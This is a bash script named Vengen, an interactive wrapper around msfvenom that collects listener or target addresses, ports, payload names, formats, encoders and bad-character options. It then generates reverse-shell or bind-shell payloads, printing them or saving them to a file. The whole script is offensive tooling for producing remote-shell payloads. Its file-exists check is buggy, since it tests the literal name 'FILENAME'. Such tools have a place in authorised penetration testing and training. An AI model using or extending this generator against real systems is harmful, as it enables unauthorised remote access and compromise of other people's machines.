#!/bin/bash

# #########################################
# Author: Alexis Rodriguez
# Date: 18 April 2020
# Vengen is a wrapper for msfvenom. It's 
# purpose is to make generating payloads
# with msfvenom easier and quicker.
# #########################################

prompt_main() {
	read -p $'\e[31m[1] Reverse [2] Bind [3] Exit [4] Clear Screen\e[0m: ' CHOSE
	# Checking if input is integer
	# If its not an integer, send the error to /dev/null
	# and recall the current function
	if ! [ $CHOSE -eq $CHOSE ] 2>/dev/null
	then
		echo -e "\e[34mNumbers please!\e[0m -:> $CHOSE is not a number..."
		prompt_main
	elif [ -z $CHOSE ]; then
		echo -e "\e[34mYou did not select an option...\e[0m"
		prompt_main
	else
		if [ $CHOSE -eq 1 ]; then
			reverse_payload
		elif [ $CHOSE -eq 2 ]; then
			bind_payload
		elif [ $CHOSE -eq 3 ]; then
			echo "Goodbye..."
			exit 0
		elif [ $CHOSE -eq 4 ]; then
			clear
			prompt_main
		else
			echo -e "\e[34mInvalid number!\e[0m -:> $CHOSE"
			prompt_main
		fi
	fi
}

# Generate reverse shell payload
reverse_payload() {
	# Reading in mininum arguments for
	# generating reverse shell payload.
	read -p $'\e[31mLHOST\e[0m: ' LOCALIP
	read -p $'\e[31mLPORT\e[0m: ' LOCALPORT
	read -p $'\e[31mPAYLOAD\e[0m: ' PAYLOAD
	read -p $'\e[31mFORMAT\e[0m: ' FORMAT
	echo -ne $'Add more options? \e[31mY/n\e[0m '
	read MOREOPTS

	# To lowercase
	MOREOPTS=$(echo $MOREOPTS |tr '[:upper:]' '[:lower:]')

	if [[ $MOREOPTS == "y" ]]; then
		more_options -p $PAYLOAD LHOST=$LOCALIP LPORT=$LOCALPORT -f $FORMAT
	fi

	read -p $'Save output to file? \e[31mY/n\e[0m ' TOFILE
	TOFILE=$(echo $TOFILE |tr '[:upper:]' '[:lower:]')

	if [[ $TOFILE == "y" ]]; then
		to_file -p $PAYLOAD LHOST=$LOCALIP LPORT=$LOCALPORT -f $FORMAT
	else
		execute -p $PAYLOAD LHOST=$LOCALIP LPORT=$LOCALPORT -f $FORMAT
	fi
}

# Generate bind shell payload
bind_payload() {
	# Reading in mininum arguments for
	# generating bind shell payload.
	read -p $'\e[31mRHOST\e[0m: ' REMOTEIP
	read -p $'\e[31mRPORT\e[0m: ' REMOTEPORT
	read -p $'\e[31mPAYLOAD\e[0m: ' PAYLOAD
	read -p $'\e[31mFORMAT\e[0m: ' FORMAT
	echo -ne $'Add more opions? \e[31mY/n\e[0m '
	read MOREOPTS
	
	# To lowercase
	MOREOPTS=$(echo $MOREOPTS | tr '[:upper:]' '[:lower:]')

	if [[ $MOREOPTS == "y" ]]; then
		more_options -p $PAYLOAD RHOST=$REMOTEIP RPORT=$REMOTEPORT -f $FORMAT
	fi

	read -p $'Save output to file? \e[31mY/n\e[0m ' TOFILE
	TOFILE=$(echo $TOFILE |tr '[:upper:]' '[:lower:]')

	if [[ $TOFILE == "y" ]]; then
		to_file -p $PAYLOAD RHOST=$REMOTEIP RPORT=$REMOTEPORT -f $FORMAT
	else
		execute -p $PAYLOAD RHOST=$REMOTEIP RPORT=$REMOTEPORT -f $FORMAT
	fi
}

# Gets file name to write and executes msfvenom 
# command with file output option
to_file() {
	read -p $'\e[34mEnter File Name:\e[0m ' FILENAME

	# Checking if file exists
	# If it does prompt user to overwrite,
	# else if it does not exist continue to
	# execution of command.
	if [ -e FILENAME ]; then
		echo "File already exits!"
		read -p $'Overwrite file? \e[31mY/n\e[0m ' OVERWRITE
		OVERWRITE=$(echo $OVERWRITE |tr '[:upper:]' '[:lower:]')

		if [[ $OVERWRITE == "y" ]]; then
			execute "$@" -o ${FILENAME}
		else
			exit 0
		fi
	else
		execute "$@" -o ${FILENAME}
	fi
}

# Shows other options to enter for msfvenom
more_options() {
	ARRAY=()

	echo -e "\n[###############################]"
	echo -e "\n\e[32mOptions\e[0m:
	[\e[1;31me\e[0m] Encoder
	[\e[1;32ma\e[0m] Architecture
	[\e[1;33mp\e[0m] Platform
	[\e[1;34mb\e[0m] Bad Characters
	[\e[1;95mc\e[0m] Custom Options
	"
	echo -e "[###############################]\n"

	echo -ne "\e[31mEnter letter/s\e[0m (Seperate with spaces): "
	# Reading elements seperated by spaces into an array.
	read -a options

	# Iterating over array elements.
	# Prompting user for value corresponding to
	# option and appending flag and value to array.
	for LETTER in ${options[@]}; do
		if [[ $LETTER == "e" ]]; then
			read -p $'\e[31mENCODER\e[0m: ' ENCODER
			ARRAY+=("--encoder" "$ENCODER")
		elif [[ $LETTER == "a" ]]; then
			read -p $'\e[31mARCHITECTURE\e[0m: ' ARCHITECTURE
			ARRAY+=("--arch" "$ARCHITECTURE")
		elif [[ $LETTER == "p" ]]; then
			read -p $'\e[31mPLATFORM\e[0m: ' PLATFORM
			ARRAY+=("--platform" "$PLATFORM")
		elif [[ $LETTER == "b" ]]; then
			read -p $'\e[31mBAD CHARACTERS\e[0m (Wrap with strings): ' BADCHARS
			ARRAY+=("--bad-chars" "$BADCHARS")
		elif [[ $LETTER == "c" ]]; then
			read -p $'\e[31mEnter your options\e[0m (Seperate with spaces): ' CUSTOM
			ARRAY+=("$CUSTOM")
		else
			echo -e "\e[34mInvalid Option!\e[0m\n"
			more_options $1 $2 $3 $4
		fi
	done

	read -p $'Save output to file? \e[31mY/n\e[0m ' TOFILE
	TOFILE=$(echo $TOFILE |tr '[:upper:]' '[:lower:]')

	if [[ $TOFILE == "y" ]]; then
		to_file "$@" ${ARRAY[@]}
	else
		execute "$@" ${ARRAY[@]}
	fi
}

# Will execute the final msfvenom command
execute() {
	msfvenom "$@"
	exit 0
}

# Print program name
prog_name() {
	echo -e "
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███████╗███╗   ██╗
██║   ██║██╔════╝████╗  ██║██╔════╝ ██╔════╝████╗  ██║
██║   ██║█████╗  ██╔██╗ ██║██║  ███╗█████╗  ██╔██╗ ██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██╔══╝  ██║╚██╗██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝███████╗██║ ╚████║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
					\e[34m@BinexisHATT\e[0m                                             
"
}

main() {
	prog_name
	prompt_main
}

main
